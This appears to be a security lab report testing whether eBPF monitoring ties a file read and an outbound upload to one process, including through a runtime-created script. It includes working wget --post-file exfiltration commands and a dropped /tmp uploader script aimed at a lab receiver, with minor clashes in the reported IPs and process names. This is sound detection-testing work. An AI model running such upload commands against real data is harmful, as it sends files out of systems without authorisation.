# QCS-H08 — Controlled Data Transfer / Exfiltration Simulation

## What we wanted to prove

When a process reads a file and sends it out of the container, can Qualys
tie the read and the send to the same actor — including when the work is
done by a script created at runtime?

## Verdict

**It works — the correlation is exact.** The file-open event and the
outbound-connection event carry the same process PID and the same parent
chain, so "this process read this file and connected to that endpoint" is
a single joined story, not two guesses.

## What we did

- Applied `policy.yaml`: an open-file audit on the payload file plus an
  egress audit on the receiver port
- Uploaded a synthetic file twice: directly, and again via a script
  written to `/tmp` at runtime

## What we observed

Upload 1 (direct `wget`):

```
wget (pid N)  → opened /tmp/citi-h08-payload.txt   [payload-open rule]
wget (pid N)  → connected 172.19.0.2:8080          [egress-audit rule]
parent: /bin/sh
```

Upload 2 (runtime script):

```
/bin/sh → /tmp/citi-h08-upload.sh → wget (pid M)
                                    → opened the payload file
                                    → connected to the receiver
```

Same file, same destination, same process on both legs — and the second
run additionally proves the transfer is attributed **through the
just-created script** as the parent.

## Privacy note (as designed)

The file-open record shows path + permissions only — **file contents are
never captured**. The connection record shows addresses and port, not the
uploaded bytes. Qualys attributes the transfer without exposing the data.

## Point-by-point check (original hypothesis)

| # | Point | Status | Evidence |
|---|---|---|---|
| E1 | Read the synthetic file | **YES** | `payload-open` (`security_file_open` by `cat`) |
| E2 | Upload to approved endpoint (direct) | **YES** | `egress-audit` `tcp_connect` by `wget` (--post-file) |
| E3 | Repeat via newly created runtime script | **YES** | script exec → `wget` upload2 → open + connect again |
| E4 | Correlate file access / process exec / network | **YES** | open + connect on the same `wget` process; script chains as parent |
| E5 | Contents NOT captured | **YES** | events carry path + socket tuple only — no payload bytes (blunt: only file NAME/path, never content) |
| — | DNS leg | **NOT covered in this run** | flow used IPs only; add `ip_output` :53 (H06/H18 pattern) for the DNS leg |

**Not covered live:** DNS leg (add ip_output raw TP if required).

## eBPF-Agent events observed (2026-11-03 run)

```json
{"process_kprobe": {"policy_name": "citi-h08-data-exfil-v2-payload-open", "function_name": "security_file_open",
 "process": {"binary": "/usr/bin/cat", "docker": "ab39fd3a52e2"},
 "args": [{"file_arg": {"path": "/tmp/citi-h08-payload.txt"}}]}}
{"process_kprobe": {"policy_name": "citi-h08-data-exfil-v2-egress-audit", "function_name": "tcp_connect",
 "process": {"binary": "/usr/bin/wget"},
 "args": [{"sock_arg": {"daddr": "172.22.0.2", "dport": 8080, "protocol": "IPPROTO_TCP", "state": "TCP_SYN_SENT"}}]}}
```

## Files in this lab

| File | Purpose |
|---|---|
| `policy.yaml` | payload-open file rule + egress audit rule |
| `pod.yaml` | pod with synthetic payload doing both uploads |
| `RESULT.md` | this document |

## docker run command used for the local proof

```bash
docker exec citi-client sh -c 'echo "synthetic-payload CITI-H08-001" > /tmp/citi-h08-payload.txt'
docker exec citi-client sh -c '
  wget -q -T 3 --post-file /tmp/citi-h08-payload.txt -O /dev/null http://citi-srv:8080/upload1
  printf "#!/bin/sh\nwget -q -T 3 --post-file /tmp/citi-h08-payload.txt -O /dev/null http://citi-srv:8080/upload2\n" > /tmp/citi-h08-upload.sh
  chmod +x /tmp/citi-h08-upload.sh
  /tmp/citi-h08-upload.sh'
```

Result: each upload produced an open event + a connect event on the same
PID; the script run chains through the script as parent.
